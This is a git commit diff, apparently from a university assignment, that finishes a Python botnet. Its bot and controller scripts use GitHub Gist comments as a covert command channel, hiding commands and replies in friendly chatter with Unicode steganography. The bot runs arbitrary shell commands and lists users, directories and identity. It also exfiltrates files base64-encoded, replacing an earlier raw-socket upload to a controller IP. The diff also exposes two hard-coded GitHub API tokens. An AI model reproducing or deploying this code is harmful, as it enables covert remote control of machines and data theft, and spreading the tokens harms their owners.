2e29615daf4131ebcddc9329e3212cf6a86f6153
Jiřík, Daniel <jirikdan@fel.cvut.cz>
2023-01-08 17:26:10 +0100

    Final version

--- bot.py
+++ bot.py
@@ -1,68 +1,31 @@
 from simplegist import Simplegist
-import time
-import random
-import os
-import tqdm
-import socket
-import threading
+import time, random, os, tqdm, socket, threading
+import base64
+import pyUnicodeSteganography as usteg
 GHgistController = Simplegist(username='jirikdan', api_token='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')
 GhgistBot = Simplegist(username='TheQfr', api_token='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')
 comments = GHgistController.comments().listall(name='secret.txt')
 commentsNumber = len(comments)
 
 
-
-#GHgistController.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='very helpful')
-
-
 botIsAliveAnswers = ["Ye, im there", "No, I am soo booored", "Hmm someone is bored :P"]
+botRandomMessage = ["What a nice day, im just here sitting programming nothing interestin really its really cool and fine. What about you guys are you up to something interesting? Or are you just doing nothing" , "Im feeling like a hero today, I was in the gym I had the greatest lunch and now im on my beloved gist talking to my beloved friends. Could it get even better? I do not think so its perfect already"]
 botIsAliveQuestions = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]
 controllerQuestions = botIsAliveQuestions
 
-#print(os.system("who | cut -d' ' -f1"))
 
-
-controllerIP = "10.0.0.59"
-SEPARATOR = "<SEPARATOR>"
-BUFFER_SIZE = 1024 * 4 #4KB
-
-
-def send_file(filename, host, port):
-    # get the file size
-    filesize = os.path.getsize(filename)
-    # create the client socket
-    s = socket.socket()
+def convert_to_plain_text(file_path):
     try:
-        print("[+] Connecting to " + str(controllerIP) + ":" + str(5001))
-        s.connect((controllerIP, 5001))
-        print("[+] Connected.")
+        with open(file_path, 'rb') as file:
+            binary_data = file.read()
+        plain_text = base64.b64encode(binary_data).decode('utf-8')
+        return plain_text
     except:
-        print("connection error")
-        return
-
-    # send the filename and filesize
-    s.send((str(filename)+str(SEPARATOR)+str(filesize)).encode())
-    time.sleep(7)
-    # start sending the file
-    progress = tqdm.tqdm(range(filesize), "Sending "+str(filename), unit="B", unit_scale=True, unit_divisor=1024)
-    with open(filename, "rb") as f:
-        while True:
-            # read the bytes from the file
-            bytes_read = f.read(BUFFER_SIZE)
-            if not bytes_read:
-                # file transmitting is done
-                break
-            # we use sendall to assure transimission in 
-            # busy networks
-            s.sendall(bytes_read)
-            # update the progress bar
-            progress.update(len(bytes_read))
-            print("progress")
-    # close the socket
-    s.close()
-
+        return "No such file exists"
 
 def handleCommands(command):
+    fakeMessage = random.choice(botRandomMessage)
+    command = usteg.decode(command)
     if command == "Hey":
         GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='Yo')
     if command in botIsAliveQuestions:
@@ -71,27 +34,45 @@ def handleCommands(command):
         sendStr = os.popen("who | cut -d' ' -f1").read()
         if sendStr == "":
             sendStr = "Noone is UP"
+        try:
+            sendStr = usteg.encode(fakeMessage, sendStr)
+        except:
+            sendStr = usteg.encode(fakeMessage, "Encryption failed")
         GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
     if command.startswith("ls"):
         sendStr = os.popen(command).read()
         if sendStr == "":
             sendStr = "There are no files in specified directory"
+        try:
+            sendStr = usteg.encode(fakeMessage, sendStr)
+        except:
+            sendStr = usteg.encode(fakeMessage, "Encryption failed")
         GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
     if command.startswith("copy"):
-        thread = threading.Thread(target=send_file("sendmepls.txt",controllerIP,5001))
-        thread.daemon = True
-        thread.start()
+        sendStr = convert_to_plain_text(command[5:])
+        sendStr = usteg.encode(fakeMessage, sendStr)
+        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
+    if command.startswith("execute"):
+        os.system(command[8:])
+        sendStr = command[8:] + " was executed"
+        sendStr = usteg.encode(fakeMessage, sendStr)
+        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
+    if command.startswith("id"):
+        sendStr = os.popen("id").read()
+        try:
+            sendStr = usteg.encode(fakeMessage, sendStr)
+        except:
+            sendStr = usteg.encode(fakeMessage, "Encryption failed")
+        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
         
-
 
 while(True):
     currComments = GHgistController.comments().listall(name='secret.txt')
     currCommentsNumber = len(currComments)
     if currCommentsNumber != commentsNumber:
         commentsDiff = currCommentsNumber - commentsNumber
-        print("Received command")
         for i in range(0,commentsDiff):
+            ## Handling command
             handleCommands(currComments[len(currComments)-1 - i])
-
         commentsNumber = currCommentsNumber
     time.sleep(2)
--- controller.py
+++ controller.py
@@ -1,98 +1,125 @@
 from simplegist import Simplegist
-import random
-import time
-import threading
-import socket
-import tqdm
-import os
-
-
-def listenForFiles():
-    SERVER_HOST = "10.0.0.59"
-    SERVER_PORT = 5001
-    BUFFER_SIZE = 4096
-    SEPARATOR = "<SEPARATOR>"
-    s = socket.socket()
-    s.bind((SERVER_HOST, SERVER_PORT))
-    s.listen(10)
-    print("[*] Listening as " + str(SERVER_HOST)+":"+ str(SERVER_PORT))
-    ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveQuestion))
-    beforeAsking = len(ghGist.comments().listall(name='secret.txt'))
-    time.sleep(6)
-    afterAsking = len(ghGist.comments().listall(name='secret.txt'))
-    botsAlive = afterAsking - beforeAsking
-    print("Receiving " + str(botsAlive) + " files")
-    for i in range(0, botsAlive):
-        client_socket, address = s.accept() 
-        print("[+] " + str(address) + " is connected.")
-        received = client_socket.recv(BUFFER_SIZE).decode()
-        print (received)
-        filename, filesize = received.split(SEPARATOR)
-        filename = os.path.basename(filename)
-        #print(filename)
-        #print(filesize)
-        filesize = int(filesize)
-        
-        progress = tqdm.tqdm(range(filesize), "Receiving "+ str(filename), unit="B", unit_scale=True, unit_divisor=1024)
-            
-        with open("copiedFiles/"+filename, "wb") as f:
-            while True:
-                    
-                bytes_read = client_socket.recv(BUFFER_SIZE)
-                if not bytes_read:    
-                    break
-                    
-                f.write(bytes_read)
-                    
-                progress.update(len(bytes_read))
-
-
-        client_socket.close()
-        s.close()
-        
-
-
-
+import random, time, threading, socket
+import tqdm, os, urllib
+from bs4 import BeautifulSoup as BS
+import base64
+import pyUnicodeSteganography as usteg
 ghGist = Simplegist(username='jirikdan', api_token='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')
 GhgistBot = Simplegist(username='TheQfr', api_token='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')
 botIsAliveQuestion = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]
+botIsAliveAnswers = ["Ye, im there", "No, I am soo booored", "Hmm someone is bored :P"]
+controllerRandomQuestions = ["What a nice day", "Im gonna watch netflix today", "Well the weather is so nice but im here using gist"]
+comments = ghGist.comments().listall(name='secret.txt')
+commentsNumber = len(comments)
 
-## check if bots are alive periodically
-def checkBots():
+fileID = 0
+
+def checkAliveBots():
     while True:
-        time.sleep(3000)
+        global commentsNumber
         ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveQuestion))
-        beforeAsking = len(ghGist.comments().listall(name='secret.txt'))
         time.sleep(6)
-        afterAsking = len(ghGist.comments().listall(name='secret.txt'))
-        print("There are " + str(afterAsking - beforeAsking) + " alive Bots")
-        time.sleep(30)
+        currComments = ghGist.comments().listall(name='secret.txt')
+        currCommentsNumber = len(currComments)
+        
+        aliveBots = 0
+        if currCommentsNumber != commentsNumber:
+            commentsDiff = currCommentsNumber - commentsNumber
+            for i in range(0,commentsDiff):
+                if currComments[len(currComments)-1 - i] in botIsAliveAnswers:
+                    aliveBots += 1
+            commentsNumber = currCommentsNumber
+        print("There are " + str(aliveBots) + " bots up and running")
+        time.sleep(60)
 
-thread = threading.Thread(target=checkBots)
-thread.daemon = True
-thread.start()
-#for i in range(4424529,4424429+300):
-    #print(i)
-    #ghGist.comments().delete(name='secret.txt', commentid=i)
-    #GhgistBot.comments().delete(id='8b1ad9484c7acb95f0a72d4c6ece1f06', commentid=i)
-  
+thread2 = threading.Thread(target=checkAliveBots)
+thread2.daemon = True
+thread2.start()
+
+def deleteAllComments():
+    print("Deleting all comments - this might take a while")
+    while len(ghGist.comments().listall(name='secret.txt')) != 0:
+        url ="https://gist.github.com/jirikdan/8b1ad9484c7acb95f0a72d4c6ece1f06"
+        usock = urllib.request.urlopen(url)
+        data = usock.read()
+        usock.close()
+        soup = BS(data, features="html.parser")
+        try:
+            comment_id = soup.find('form', {'class':'js-comment-update'}).attrs.get("action")
+            size = len(comment_id)
+            comment_id = comment_id[size-7:]
+            ghGist.comments().delete(name='secret.txt', commentid=comment_id)
+            GhgistBot.comments().delete(id='8b1ad9484c7acb95f0a72d4c6ece1f06', commentid=comment_id)
+        except:
+            #print("break")
+            #break
+            continue
+    print("Done")
+
+
+def reconstruct_from_plain_text(plain_text, file_path,command):
+    global fileID
+    #print(plain_text)
+    file_path = command[5:]
+    _, file_ext = os.path.splitext(file_path)
+    
+    binary_data = base64.b64decode(plain_text.encode('utf-8'))
+    with open("copiedFiles/"+str(fileID)+file_path, 'wb') as file:
+        file.write(binary_data)
+        fileID += 1 
+    print("Received file is in copiedFiles/"+str(fileID-1)+file_path)
+
+
+
+def receiveBotAnswer(command):
+    fakeMessage = random.choice(controllerRandomQuestions)
+    sendStr = usteg.encode(fakeMessage, command)
+    ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
+    beforeCommentsNumber = len(ghGist.comments().listall(name='secret.txt'))
+    #wait for bots to make their answer
+    time.sleep(5)
+    #get the answers
+    currComments = ghGist.comments().listall(name='secret.txt')
+    afterCommentsNumber = len(currComments)
+    diff = afterCommentsNumber - beforeCommentsNumber
+    for i in range(0, diff):
+        currComment = currComments[len(currComments)-1 - i]
+        if command.startswith('execute'):
+            print(usteg.decode(currComment))
+        if command.startswith('w'):
+            print(usteg.decode(currComment))
+        if command.startswith('ls'):
+            print(usteg.decode(currComment))
+        if command.startswith('id'):
+            print(usteg.decode(currComment))
+        if command.startswith('copy'):
+            if (currComment.startswith('No such')):
+                print("No such file exists")
+            else:
+                reconstruct_from_plain_text(usteg.decode(currComment), "copiedFiles/", command)
+
+
 while True:
-    #command = raw_input("Paste your command or type HELP for help\n")
-    command = raw_input("Type your command\n")
-    if command == "HELP":
+    command = input("Type your command or help for help\n")
+    if len(ghGist.comments().listall(name='secret.txt')) == 30:
+        print("Max commands reached, reseting gist")
+        deleteAllComments()
+    if command == "HELP" or command == "help":
         print("w - (list of users currently logged in)")
         print("ls <PATH> (list content of specified directory)")
-        print("id (if of current user)")
-        print("Copy a file from the bot to the controller. The file name is specified")
-        print("Execute a binary inside the bot given the name of the binary. Example: execute /usr/bin/ps")
+        print("id (if of current user). Example: id")
+        print("copy - copies a file from the bot to the controller. The file name is specified. Example copy file.txt")
+        print("execute - executes a binary inside the bot given the name of the binary. Example: execute /usr/bin/ps")
+        print("reset - delete comments on gist")
     if command.startswith('execute'):
-        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
+        receiveBotAnswer(command)
     if command.startswith('w'):
-        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
+        receiveBotAnswer(command)
     if command.startswith('ls'):
-        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
+        receiveBotAnswer(command)
+    if command.startswith('id'):
+        receiveBotAnswer(command)
     if command.startswith('copy'):
-        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
-        threadListenForFiles = threading.Thread(target=listenForFiles)
-        threadListenForFiles.daemon = True
-        threadListenForFiles.start()
+        receiveBotAnswer(command)  	
+    if command.startswith('reset'):
+        deleteAllComments()
